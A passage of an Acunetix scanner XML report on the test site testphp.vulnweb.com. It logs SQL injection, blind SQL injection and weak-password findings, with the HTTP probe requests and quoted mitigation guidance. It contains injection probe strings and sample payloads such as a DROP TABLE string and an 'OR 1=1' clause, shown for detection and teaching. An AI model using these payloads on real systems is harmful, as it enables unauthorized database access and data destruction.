<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /AJAX/infoartist.php?id=1'&quot; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:56 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 148
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="49" color="red">
       <Name><![CDATA[Weak password]]></Name>
       <ModuleName><![CDATA[Scripting (Html_Authentication_Audit.script)]]></ModuleName>
       <Details><![CDATA[Username: <b><font color="dark">test</font></b>, Password: <b><font color="dark">test</font></b>]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may access the contents of the password-protected page.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">Manual confirmation is required for this alert.</font></div><br/>This page is using a weak password. Acunetix WVS was able to guess the credentials required to access this page. A weak password is short, common, a system default, or something that could be rapidly guessed by executing a brute force attack using a subset of all possible passwords, such as words in the dictionary, proper names, words based on the user name or common variations on these themes.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Enforce a strong password policy. Don't permit weak passwords or passwords based on dictionary words.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 20
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=test&amp;uname=test]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:52:17 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Set-Cookie: login=test%2Ftest
Original-Content-Encoding: gzip
Content-Length: 5096
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Wikipedia - Password strength]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Password_strength]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Authentication Hacking Attacks]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/authentication/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="50" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62</font></pre>]]></Details>
       <Affects><![CDATA[/artists.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /artists.php?artist=1'&quot; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:52:29 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4060
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="51" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 470=470</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*470*465*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*470 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 470=470 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 470=470 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 470=470 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 470=470 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 470=470 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 470=470 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/artists.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
